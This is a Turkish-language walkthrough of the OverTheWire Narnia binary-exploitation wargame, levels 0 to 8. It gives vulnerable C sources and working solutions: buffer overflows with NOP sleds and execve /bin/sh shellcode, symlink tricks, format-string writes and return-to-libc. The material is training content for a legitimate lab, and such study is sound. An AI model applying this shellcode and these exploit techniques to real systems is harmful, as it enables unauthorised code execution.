# 💥 OverTheWire: Narnia — Level 0'dan Level 8'e Türkçe Rehber

> Narnia, **binary exploitation**'a (ikili dosya istismarı) giriş yapılan ilk wargame.  
> Her level gerçek bir C programı — kaynak kodu veriliyor ama açığı bulmak ve  
> exploit yazmak sana kalıyor. Assembly okuma ve GDB zorunlu, sabır daha da zorunlu.

**Platform:** `narnia.labs.overthewire.org` | **Port:** `2226`  
**Başlangıç:** kullanıcı `narnia0`, şifre `narnia0`  
**Dosyalar:** `/narnia/` klasöründe  
**Referans:** [cplusperks.com](https://cplusperks.com/narnia/) · [hackmd.io](https://hackmd.io/@Chivato/B112H_I18) · [tuonilabs.wordpress.com](https://tuonilabs.wordpress.com/2017/05/13/overthewire-narnia-write-up/)

---

## ⚠️ Ön Koşullar

Narnia'ya başlamadan önce şunları bilmen gerekiyor:

| Konu | Neden gerekli |
|---|---|
| x86 Assembly temelleri | GDB çıktısını okumak için |
| C programlama temelleri | Kaynak kodu anlamak için |
| GDB kullanımı | Stack'i incelemek için |
| Little-endian byte sırası | Adresleri doğru yazmak için |
| Stack yapısı (EBP, ESP, EIP) | Overflow nereye gidiyor? |

Hazır değilsen önce şu kaynakları oku:
- [x86 Assembly — NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
- [GDB Quick Reference](https://users.ece.utexas.edu/~adnan/gdb-refcard.pdf)
- [Buffer Overflow — LiveOverflow](https://www.youtube.com/watch?v=T03idxny9jE)

---

## 🗺️ Genel Bakış

| Level | Açık | Teknik |
|---|---|---|
| 0 → 1 | Stack buffer overflow (değişken üzerine yaz) | `scanf` → `val` üzerine yaz |
| 1 → 2 | Environment variable shellcode | `EGG` değişkenine shellcode koy |
| 2 → 3 | Stack buffer overflow (EIP kontrolü) | `strcpy` + NOP sled + shellcode |
| 3 → 4 | Buffer overflow + sembolik link | `ofile` üzerine yaz, symlink ile şifreyi kopyalat |
| 4 → 5 | Stack buffer overflow (env temizlenmiş) | NOP sled + shellcode, ortam değişkeni yok |
| 5 → 6 | Format string saldırısı | `%n` ile değişken üzerine yaz |
| 6 → 7 | Return-to-libc + fonksiyon pointer | `fp` üzerine `system()` adresi yaz |
| 7 → 8 | Format string → fonksiyon pointer | `ptrf`'i `hackedfunction`'a yönlendir |
| 8 → 9 | `blah` pointer manipülasyonu + env shellcode | Pointer'ı düzelt, ret adresini ele geçir |

---

## ⚠️ Payload Yazımı: Python 2 vs Python 3 (önce bunu oku!)

Bu rehberdeki payload'lar **Python 3** ile yazılmıştır. Eski Narnia writeup'larında göreceğin `python -c 'print "\xef..."'` kalıbı **Python 2**'ye aittir ve Python 2 artık çoğu sistemde yok.

**Kritik tuzak:** Python 2'den 3'e geçerken `print("\xef\xbe\xad\xde")` yazarsan **byte'lar bozulur**. Python 3'te `"\xef"` bir `str`'dir ve çıktıya yazılırken UTF-8'e kodlanır (`0xef` → `0xc3 0xaf`). Ham byte üretmek için **`sys.stdout.buffer.write(b"...")`** kullanmak zorundasın:

```bash
# DOĞRU — ham byte üretir
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'

# YANLIŞ — \xef'i 0xc3 0xaf'a çevirir, exploit patlar
python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")'
```

> 💡 Sadece ASCII üreten basit tekrarlar için (`"A"*22` gibi) `python3 -c 'print("A"*22)'` sorunsuz çalışır; tuzak yalnızca `\x..` ham byte'larında geçerlidir.
>
> 💡 OverTheWire sunucusunda `python` tarihsel olarak Python 2'ye bağlıdır, yani eski writeup'lardaki `python -c 'print ...'` orada çalışabilir — ama taşınabilir ve tutarlı olması için aşağıda hep `python3 ... buffer.write(b"...")` kullanıyoruz.

---

## Level 0 → Level 1 — Stack Buffer Overflow (Değişken Üzerine Yazma)

### 🔐 Bağlantı
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226
# Şifre: narnia0
```

### 🎯 Görev
`val` değişkenini `0x41414141`'den `0xdeadbeef`'e değiştir → shell al.

### 📖 Kaynak Kod
```c
int main(){
    long val = 0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    scanf("%24s", &buf);      // 24 byte okuyor ama buf sadece 20!

    if(val == 0xdeadbeef)
        system("/bin/sh");
    else
        printf("WAY OFF!!!!\n");
}
```

### 📖 Teori: Stack Layout ve Buffer Overflow

Stack'te değişkenler sırayla yerleşir:
```
Düşük adres  →  [buf: 20 byte][val: 4 byte]  →  Yüksek adres
```

`scanf("%24s")` 24 byte okur ama `buf` sadece 20 byte. Fazla byte'lar `val`'in üzerine yazar!

**Little-endian:** x86 sistemlerde çok byte'lı değerler ters sırada saklanır.  
`0xdeadbeef` → `\xef\xbe\xad\xde` olarak yazılır.

### 🔧 Çözüm

```bash
narnia0@narnia:/narnia$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
buf: AAAAAAAAAAAAAAAAAAAA
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
<şifre buraya gelir>
```

> 💡 **`; cat` neden?** Shell açılıp hemen kapanmasın diye. `cat` stdin'i açık tutar, komut girebilirsin.

> 💡 **Little-endian:** `0xdeadbeef` → bellekte `ef be ad de` sıralamasıyla yazılır.

---

## Level 1 → Level 2 — Environment Variable Shellcode

### 🔐 Bağlantı
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`EGG` environment variable'ına shellcode koy, binary onu çalıştırır.

### 📖 Kaynak Kod
```c
int main(){
    int (*ret)();

    if(getenv("EGG") == NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    ret = getenv("EGG");   // EGG'in adresini fonksiyon pointer'a ata
    ret();                 // O adresi çalıştır!
}
```

### 📖 Teori: Shellcode ve Environment Variable

**Shellcode:** `/bin/sh` açan makine kodu. Assembly'de yazılıp hex byte'lara dönüştürülür.

Klasik x86 Linux shellcode (25 byte):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```
Bu `execve("/bin//sh", ["/bin//sh"], NULL)` yapar → shell açar.

### 🔧 Çözüm

```bash
# EGG değişkenine shellcode yaz
narnia1@narnia:/narnia$ export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')

# Çalıştır
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
<şifre buraya gelir>
```

> 💡 **Shell-storm.org** — farklı mimari ve OS için hazır shellcode'lar bulabileceğin site.

---

## Level 2 → Level 3 — EIP Kontrolü + NOP Sled

### 🔐 Bağlantı
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`EIP` register'ını ele geçir, shellcode'a yönlendir.

### 📖 Kaynak Kod
```c
int main(int argc, char *argv[]){
    char buf[128];

    if(argc == 1){ printf("Usage: %s argument\n", argv[0]); exit(1); }
    strcpy(buf, argv[1]);   // Boyut kontrolü yok!
    printf("%s", buf);
}
```

### 📖 Teori: EIP Kontrolü ve NOP Sled

**EIP (Extended Instruction Pointer):** Bir sonraki çalıştırılacak komutun adresi. Fonksiyon çağrısında stack'e kaydedilir.

Stack yapısı:
```
[buf: 128 byte][...][saved EBP: 4 byte][return addr (EIP): 4 byte]
```

128 byte buffer'ı taşırıp return address'e shellcode'umuzun adresini yazarsak → fonksiyon dönünce shellcode çalışır!

**NOP Sled (`\x90`):** "No Operation" byte'ı. CPU atlayıp geçer. Shellcode'dan önce çok sayıda `\x90` koyarsak, tam adres bilmeden da shellcode'a ulaşabiliriz.

```
[NOPs ... NOPs][SHELLCODE][RETURN_ADDR]
      ↑
      Buraya atlarsan shellcode'a kayarsın
```

### 🔧 Çözüm

> ⚠️ **Offset sabit bir sayı DEĞİL.** Derleyici/ortama göre değişir; bu binary'de yaygın olarak **132 veya 140** çıkar (bazı writeup'lar 140, bazıları 132 buluyor — ikisi de gerçek). Aşağıdaki `140` örnektir; **kendi binary'inde `cyclic` ile doğrula** ve NOP sayını ona göre ayarla.

```bash
# 1. Offset'i cyclic pattern ile KESİN bul (pwndbg/GEF içinde)
narnia2@narnia:/narnia$ gdb -q narnia2
pwndbg> cyclic 200
aaaabaaacaaadaaa...
pwndbg> r aaaabaaacaaadaaa...        # cyclic çıktısını argüman ver
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()                  # EIP bu desenle ezildi
pwndbg> cyclic -l 0x41414141         # EIP'teki değeri offset'e çevir
140                                   # ← bu binary'de offset = 140 (sende 132 olabilir)

# (pwndbg/GEF yoksa: pwntools ile  cyclic(200) üret,
#  python3 -c 'from pwn import *; print(cyclic_find(0x41414141))' ile çöz)

# 2. Buffer'ın stack adresini bul
pwndbg> r $(python3 -c 'print("A"*140)')
pwndbg> x/40wx $esp
...
0xffffd830: 0x41414141 0x41414141 ...  # ← buffer burada başlıyor

# 3. NOP sled + shellcode + return address
#    NOP sayısı = offset - shellcode_uzunlugu = 140 - 25 = 115
#    Return adresi NOP sled'in ORTASINI göstersin (tabanını değil!): örn. 0xffffd850
narnia2@narnia:/narnia$ ./narnia2 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*115 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + b"\x50\xd8\xff\xff")')"
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
<şifre buraya gelir>
```

> ⚠️ **GDB'deki adres ile gerçek adres farklı olur.** GDB fazladan ortam değişkeni ve farklı bir `argv[0]` enjekte ettiği için buffer'ın adresi `./narnia2` ile doğrudan çalıştırınca kayar. Bu yüzden iki şey yaparız: (1) return adresini NOP sled'in **ortasına** nişanlarız (tabanına değil) ki birkaç byte'lık kayma tolere edilsin, (2) gerekirse adresi birkaç değer deneyerek (`0xffffd840`, `0xffffd850`...) ayarlarız. Acemilerin en sık takıldığı nokta budur.

---

## Level 3 → Level 4 — Buffer Overflow + ofile Manipülasyonu

### 🔐 Bağlantı
```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
Dosya kopyalama programı. `ofile`'ı hedef şifre dosyasına yönlendir.

### 📖 Kaynak Kod
```c
int main(int argc, char **argv){
    int ifd, ofd;
    char ofile[16] = "/dev/null";  // Çıktı: /dev/null
    char ifile[32];                // Girdi: argv[1]
    char buf[32];

    strcpy(ifile, argv[1]);        // ifile'a kopyala — kontrol yok!
    ofd = open(ofile, O_RDWR);     // ofile'ı aç
    ifd = open(ifile, O_RDONLY);   // ifile'ı aç
    read(ifd, buf, sizeof(buf)-1);
    write(ofd, buf, sizeof(buf)-1);// ifile'ı ofile'a yaz
}
```

Stack'te sıralama: `[ifile: 32 byte][ofile: 16 byte]`  
`ifile`'ı 32 byte'dan fazla doldurursan `ofile`'ın üzerine yazarsın!

### 🔧 Çözüm

```bash
narnia3@narnia:/narnia$ mkdir /tmp/ex3 && cd /tmp/ex3

# argv[1]'in ilk 32 byte'ı ifile'ı tam doldurur, kalanı ofile'a taşar.
# "/tmp/ex3/" (9) + 22*"A" (31) + "/" (32) = ifile'ı doldurur,
# ardından "readthis" → ofile olur. ifile null'suz kaldığı için
# bitişikteki ofile ile birleşip "/tmp/ex3/<22A>/readthis" yolunu oluşturur.
narnia3@narnia:/tmp/ex3$ mkdir $(python3 -c 'print("A"*22)')
narnia3@narnia:/tmp/ex3$ ln -s /etc/narnia_pass/narnia4 /tmp/ex3/$(python3 -c 'print("A"*22)')/readthis

# ofile olarak açılacak yazılabilir dosyayı oluştur (./readthis)
narnia3@narnia:/tmp/ex3$ touch readthis && chmod 777 readthis

# Çalıştır: ifd = symlink (→ narnia4 şifresi), ofd = ./readthis
narnia3@narnia:/tmp/ex3$ /narnia/narnia3 /tmp/ex3/$(python3 -c 'print("A"*22)')/readthis

narnia3@narnia:/tmp/ex3$ cat readthis
<şifre buraya gelir>
```

> 💡 **Stack sırasını GDB ile doğrula.** Bu exploit `ifile`'ın hemen üstünde `ofile`'ın oturduğunu varsayar; derleyici sıralaması farklıysa dolgu uzunluğu değişir. `b *main+OFFSET` ile `strcpy` sonrası `x/20wx $esp` çekip `ifile`/`ofile` adreslerini gör.

---

## Level 4 → Level 5 — Ortam Temizlenmiş Overflow

### 🔐 Bağlantı
```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
Level 2 ile aynı ama bu sefer ortam değişkenleri (`environ`) sıfırlanıyor. Shellcode'u buffer'ın içine koy.

### 📖 Kaynak Kod
```c
extern char **environ;
int main(int argc, char **argv){
    int i;
    char buffer[256];

    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));  // Ortam değişkenlerini sil!

    if(argc > 1)
        strcpy(buffer, argv[1]);  // Boyut kontrolü yok
}
```

Environ silindi → shellcode'u environment variable'a koyamayız. Ama buffer 256 byte — shellcode için fazlasıyla yeterli!

### 🔧 Çözüm

```bash
# 1. Offset'i cyclic ile doğrula (bu binary'de yaygın olarak 264)
narnia4@narnia:/narnia$ gdb -q narnia4
pwndbg> cyclic 320
pwndbg> r aaaabaaac...                 # cyclic çıktısı
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
pwndbg> cyclic -l 0x41414141
264                                      # ← offset = 264 (256 buffer + 8 dolgu/EBP)

# 2. Buffer adresini bul (ltrace de iş görür: strcpy'nin hedef adresi)
narnia4@narnia:/narnia$ ltrace ./narnia4 $(python3 -c 'print("A"*264)') 2>&1 | grep strcpy
strcpy(0xffffd4d4, "AAAA...")            # ← buffer 0xffffd4d4
# veya GDB:  pwndbg> r $(python3 -c 'print("A"*264)') ; x/40wx $esp

# 3. NOP sled + shellcode + return address
#    NOP sayısı = offset - shellcode_uzunlugu = 264 - 25 = 239
#    Dikkat: BURADA "BBBB" gibi fazladan dolgu YOK — adres tam offset 264'e oturmalı.
#    Return adresi NOP sled'in ORTASINI göstersin: örn. 0xffffd560
narnia4@narnia:/narnia$ ./narnia4 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*239 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + b"\x60\xd5\xff\xff")')"
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
<şifre buraya gelir>
```

> 💡 narnia4 ortam değişkenlerini kendisi sildiği için, GDB ile gerçek çalıştırma arasındaki adres farkı narnia2'ye göre **daha küçüktür** (adres kaymasının başlıca sebebi env değişkenleridir). Yine de 239 byte'lık NOP sled bolca tolerans verir; adresi sled'in ortasına nişanla.

---

## Level 5 → Level 6 — Format String Saldırısı

### 🔐 Bağlantı
```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`i` değişkenini 1'den 500'e değiştir. Buffer overflow yok — format string açığı var.

### 📖 Kaynak Kod
```c
int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);  // FORMAT STRING AÇIĞI!
    if(i == 500){
        system("/bin/sh");
    }
    printf("i = %d (%p)\n", i, &i);  // i'nin adresini veriyor!
}
```

### 📖 Teori: Format String Açığı

`printf("%s", input)` güvenli, ama `printf(input)` tehlikeli!

Format string `%n` → o ana kadar yazdırılan byte sayısını belirtilen adrese yazar:
```
"\xADDR%496x%5$n"
→ Adres 4 byte, sonra 496 boşluk = toplam 500 byte
→ %5$n → stack'teki 5. argümanın adresine 500 yazar
```

### 🔧 Çözüm

```bash
# 1. Buffer'ın kaçıncı argüman olduğunu bul
narnia5@narnia:/narnia$ ./narnia5 AAAA%x.%x.%x.%x.%x
# çıktıda 41414141 kaçıncı %x'te görünüyorsa offset o: burada 5

# 2. i'nin adresini PAYLOAD UZUNLUĞUYLA AYNI bir çalıştırmada sız.
#    Önce sahte bir adresle (BBBB) tam payload'u çalıştır; yazma başarısız
#    olur ama program sonda &i'yi yazdırır — argv[1] uzunluğu artık nihai
#    payload'la aynı olduğu için bu adres doğru olandır.
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"BBBB" + b"%.496x%5$n")')"
i = 1 (0xffffd6cc)        # ← i'nin adresi (bu uzunluk için)

# 3. BBBB yerine sızdırdığın adresi (0xffffd6cc → \xcc\xd6\xff\xff) koy
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xcc\xd6\xff\xff" + b"%.496x%5$n")')"
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
<şifre buraya gelir>
```

> ⚠️ **`i`'nin adresi argv[1] uzunluğuna göre kayar.** `./narnia5 AAAA` ile okuduğun adres (kısa argüman) nihai payload'da (uzun argüman) genelde TUTMAZ. Bu yüzden adresi yukarıdaki gibi *aynı uzunlukta* bir çalıştırmada sızdırıp kullan.
>
> 💡 Sayım: 4 (adres byte'ları) + `%.496x` (496) = 500, `%5$n` bunu `&i`'ye yazar.
>
> 💡 İki teknik incelik (glibc'de sorun çıkarmaz): (1) `snprintf` çıktıyı 64 byte'a kırpar ama `%n`'e giden sayaç yine de tam değeri (500) alır; (2) konumlu `%5$n` ile konumsuz `%.496x` karıştırmak teknik olarak UB'dir ama glibc bunu çalıştırır.

---

## Level 6 → Level 7 — Return-to-libc + Fonksiyon Pointer

### 🔐 Bağlantı
```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`fp` fonksiyon pointer'ını `puts`'tan `system`'e yönlendir, `b1`'i `/bin/sh` yap.

### 📖 Kaynak Kod
```c
extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {              // esp'nin üst byte'ını döndürür (stack ~0xff......)
    __asm__("movl %esp, %eax\n\t"
            "and $0xff000000, %eax");
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char *) = (int(*)(char *))&puts, i;   // fp → puts

    if(argc != 3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    for(i=0; environ[i] != NULL; i++)               // ortam değişkenlerini sil
        memset(environ[i], '\0', strlen(environ[i]));
    for(i=3; argv[i] != NULL; i++)                  // argv[3] ve sonrasını sil
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1, argv[1]);   // b1'e kopyala — boyut kontrolü yok!
    strcpy(b2, argv[2]);   // b2'ye kopyala — boyut kontrolü yok!

    if(((unsigned long)fp & 0xff000000) == get_sp())  // fp stack'i mi gösteriyor?
        exit(-1);                                     // ← evetse ÇIK: stack shellcode'u engeller
    fp(b1);                // fp(b1): normalde puts(b1), ama fp'yi ele geçirebiliriz

    exit(1);
}
```

Stack sıralaması: `[b2][b1][fp]` — `b1`'i (8 byte) taşırınca hemen üstündeki `fp`'ye ulaşırsın!

> 🔑 **Bu seviyeyi neden return-to-libc çözüyor?** `get_sp()`, `esp & 0xff000000` döndürür — yani stack'in üst byte'ı (genelde `0xff`). Kontrol şunu der: *eğer `fp` stack bölgesini gösteriyorsa (`fp & 0xff000000 == 0xff000000`) çık.* Bu yüzden `fp`'yi stack'teki shellcode'a yönlendiremezsin. Çözüm, `fp`'yi **libc'deki `system`'e** (adresi `0xf7......`, üst byte stack'le eşleşmez) yöneltmektir. Ayrıca `environ` ve fazla argümanlar silindiği için shellcode'u oraya da koyamazsın — return-to-libc tek yol.

### 📖 Teori: Return-to-libc

Shellcode yerine zaten bellekte olan `system()` fonksiyonunu çağırırız. Environ sıfırlanmış olsa da libc her zaman bellekte!

```bash
(gdb) p system
$1 = {<text variable>} 0xf7e62cd0 <system>
```

### 🔧 Çözüm

```bash
narnia6@narnia:/narnia$ gdb -q narnia6
(gdb) p system
$1 = 0xf7e62cd0   # system'in adresi

# b1 = 8 byte doldur + system adresi → fp'yi ele geçir
# b2 = 8 byte doldur + /bin/sh → b1 üzerinden geç

narnia6@narnia:/narnia$ ./narnia6 \
  "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8 + b"\xd0\x2c\xe6\xf7")')" \
  "$(python3 -c 'import sys; sys.stdout.buffer.write(b"B"*8 + b"/bin/sh")')"
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
<şifre buraya gelir>
```

> ⚠️ `system()` adresi sisteme göre değişir, GDB ile kendin bul.

---

## Level 7 → Level 8 — Format String → Fonksiyon Pointer

### 🔐 Bağlantı
```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`ptrf` pointer'ını `goodfunction`'dan `hackedfunction`'a değiştir.

### 📖 Kaynak Kod
```c
int vuln(const char *format){
    char buffer[128];
    int (*ptrf)();

    ptrf = goodfunction;
    snprintf(buffer, sizeof buffer, format);  // Format string açığı!
    return ptrf();   // hackedfunction'a yönlendirmemiz gerekiyor
}

int hackedfunction(){
    system("/bin/sh");   // Hedef bu!
}
```

### 🔧 Çözüm

```bash
# Adresler programı çalıştırınca verilir
narnia7@narnia:/narnia$ ./narnia7 test
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706
before : ptrf() = 0x80486e0 (0xffffd61c)   # ← ptrf BU adreste duruyor

# Hedef değer (ptrf'ye yazılacak) = 0x08048706
#   Yüksek yarı (HOB) = 0x0804 = 2052
#   Düşük  yarı (LOB) = 0x8706 = 34566
# Offset = 6 (ltrace ile doğrula: format string buffer kaçıncı argüman)
```

**Adres sırası — en kritik nokta (çoğu kişi burada hata yapar):**

`%hn` 2 byte (16-bit) yazar, değer = o ana kadar basılan toplam byte sayısı. Bu sayaç **sadece artar**, o yüzden **önce küçük değeri** yazmak zorundasın.

- Little-endian: 4 byte'lık `0x08048706` bellekte `06 87 04 08` durur. Yani **düşük yarı (`0x8706`) düşük adrese** (`0xffffd61c`), **yüksek yarı (`0x0804`) yüksek adrese** (`0xffffd61c+2 = 0xffffd61e`) gider.
- `0x0804` (2052) < `0x8706` (34566) → önce 2052'yi yazarız. 2052 = yüksek yarı → **yüksek adrese** (`0xffffd61e`) gider.
- Dolayısıyla payload'da **`addr+2` (`\x1e\xd6\xff\xff`) ÖNCE**, `addr` (`\x1c\xd6\xff\xff`) sonra gelir. İlk `%hn` (`%6$hn`) ilk adresi, ikinci `%hn` (`%7$hn`) ikinci adresi hedefler.

```bash
# Sayım:  8 (adres byte'ları) + 2044 = 2052 = 0x0804  → %6$hn, 0xffffd61e'ye
#         2052 + 32514 = 34566 = 0x8706              → %7$hn, 0xffffd61c'ye
# Sonuç:  0xffffd61c = 06 87 04 08 = 0x08048706  ✓
narnia7@narnia:/narnia$ ./narnia7 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x1e\xd6\xff\xff\x1c\xd6\xff\xff" + b"%.2044x%6$hn%.32514x%7$hn")')"
Way to go!!!!
$ cat /etc/narnia_pass/narnia8
<şifre buraya gelir>
```

> ⚠️ **Yaygın hata:** Adresleri `addr` sonra `addr+2` (yani `\x1c...\x1e...`) sırasıyla yazmak. O zaman `0x0804` düşük adrese, `0x8706` yüksek adrese gider ve sonuç `0x87060804` olur — yanlış! Doğru sıra yukarıdaki gibi `addr+2` önce.
>
> 💡 `%hn` → 2 byte (short) yazar, `%n` → 4 byte. `%hhn` → tek byte (alternatif: dört `%hhn` ile byte byte de yazılabilir).

---

## Level 8 → Level 9 — Pointer Manipülasyonu + Env Shellcode

### 🔐 Bağlantı
```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`blah` pointer'ı kendi kendini koruyan bir döngü var. Pointer'ı düzelterek overflow yap, return adresini shellcode'a yönlendir.

### 📖 Kaynak Kod
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;                          // ← i GLOBAL: stack'te DEĞİL (layout'u etkiler)

void func(char *b){
    char *blah = b;             // blah, b'yi (yani argv[1]'i) gösteren bir pointer
    char bok[20];

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)   // SINIR KONTROLÜ YOK
        bok[i] = blah[i];            // blah'ın gösterdiği yerden bok'a kopyala
    printf("%s\n", bok);
}

int main(int argc, char **argv){
    if(argc > 1)
        func(argv[1]);
    else
        printf("%s argument\n", argv[0]);
    return 0;
}
```

**Neden düz overflow çalışmıyor?** Döngünün sınır kontrolü yok, ama kopyaladığın kaynak `blah`'ın gösterdiği yer. `bok[20]`'yi taşırınca, `i` `blah` pointer'ının stack'teki konumuna ulaştığında `bok[i] = blah[i]` ile **`blah`'ın kendisini ezersin**. O andan itibaren `blah[i]` artık argv[1]'i değil, yeni (ezilmiş) adresi okur — döngü bambaşka bir yerden okumaya başlar. Bu **kendine referans veren (self-referential)** davranış, klasik "20 A yaz, taş" yaklaşımını bozar.

**Fikir:** Overflow'la `blah`'ı, *senin kontrol ettiğin* bir bölgeyi gösterecek şekilde ez; böylece döngü senin byte'larını kopyalamaya devam edip kayıtlı dönüş adresinin (saved EIP) üzerine shellcode adresini yazsın.

### 🔧 Çözüm

```bash
# 1. Shellcode'u environment variable'a koy
narnia8@narnia:/narnia$ export PERKS=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')

# 2. getenvaddr programıyla PERKS'in adresini bul
# (Bu programı /tmp/getenvaddr.c olarak derliyorsun)
cat > /tmp/getenvaddr.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *ptr = getenv(argv[1]);
    if (!ptr) { printf("Not found\n"); return 1; }
    if (argc == 3) ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s will be at %p\n", argv[1], ptr);
    return 0;
}
EOF
gcc -m32 /tmp/getenvaddr.c -o /tmp/getenvaddr

# 3. PERKS adresini bul (binary ile aynı isimde çağır — argv[0] uzunluğu adresi etkiler)
narnia8@narnia:/narnia$ /tmp/getenvaddr PERKS ./narnia8
PERKS will be at 0xffffdf66          # ← shellcode adresi (örnek; sende farklı)

# 4. GDB ile blah'ın ve saved EIP'in offsetlerini KENDİN bul.
#    func içindeki printf'e breakpoint koy, x/40wx $esp ile stack'i incele:
#    - bok ile blah arası kaç byte? (genelde 20, ama derleyiciye göre değişir)
#    - blah'ı hangi adrese çevirmeli ki döngü saved EIP'i ezsin?
#    Aşağıdaki adresler ÖRNEKTİR — sende farklı çıkar.

# 5. Exploit (yapı: bok dolgusu + blah'ı yönlendir + dolgu + shellcode adresi)
#    \x85\xdf\xff\xff ve \x66\xdf\xff\xff ÖRNEK adreslerdir — GDB'den kendi
#    değerlerini koy. "12" de örnektir; blah↔saved-EIP mesafesine göre ayarla.
narnia8@narnia:/narnia$ ./narnia8 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x85\xdf\xff\xff" + b"A"*12 + b"\x66\xdf\xff\xff")')"
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
<şifre buraya gelir>
```

> ⚠️ narnia8 Narnia'nın en ince seviyesidir; yukarıdaki adresler ve dolgu uzunlukları **tamamen senin binary'inin stack düzenine bağlıdır**. Önce `getenvaddr` ile shellcode adresini, sonra GDB'de `func`'taki `printf`'e breakpoint koyup `bok`/`blah`/saved-EIP konumlarını çıkar; payload'u ona göre kur.

---

## 🏁 Tebrikler — Narnia Tamamlandı!

```bash
ssh narnia9@narnia.labs.overthewire.org -p 2226
narnia9@narnia:~$ cat CONGRATULATIONS
you are l33t! next plz...
```

---

## 📚 Öğrenilen Binary Exploitation Kavramları

| Kavram | Açıklama |
|---|---|
| **Buffer Overflow** | Buffer'ı taşırıp bitişik belleği ezmek |
| **EIP Kontrolü** | Return address üzerine yazarak kod akışını yönlendirme |
| **NOP Sled (`\x90`)** | Shellcode'a "kaymak" için dolgu |
| **Shellcode** | `/bin/sh` açan küçük makine kodu |
| **Little-endian** | Adresleri ters sırada yazmak: `0xdeadbeef` → `\xef\xbe\xad\xde` |
| **Return-to-libc** | Shellcode yerine mevcut kütüphane fonksiyonunu çağırma |
| **Format String** | `%n` ile belleğe yazma, `%x` ile okuma |
| **Fonksiyon Pointer** | Overflow ile fonksiyon adresini değiştirme |
| **Environment Shellcode** | Shellcode'u env variable'da saklama |

## 📚 Kullanılan GDB Komutları

```
gdb -q binary            → GDB başlat
r argüman                → Çalıştır
b *func+OFFSET           → Breakpoint koy
x/20wx $esp              → Stack'i hex göster
x/s $adres               → Adresteki string'i göster
p system                 → system() adresini bul
info registers           → Register değerlerini göster
disas main               → Assembly kodunu göster
set disassembly-flavor intel  → Intel syntax kullan
```

---

## 🔗 Faydalı Kaynaklar

- [OverTheWire Narnia](https://overthewire.org/wargames/narnia/)
- [cplusperks.com Narnia Full Writeup](https://cplusperks.com/narnia/) (tüm level'lar)
- [HackMD Narnia 0-4](https://hackmd.io/@Chivato/B112H_I18)
- [TuoniLabs Narnia Writeup](https://tuonilabs.wordpress.com/2017/05/13/overthewire-narnia-write-up/)
- [LiveOverflow — Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
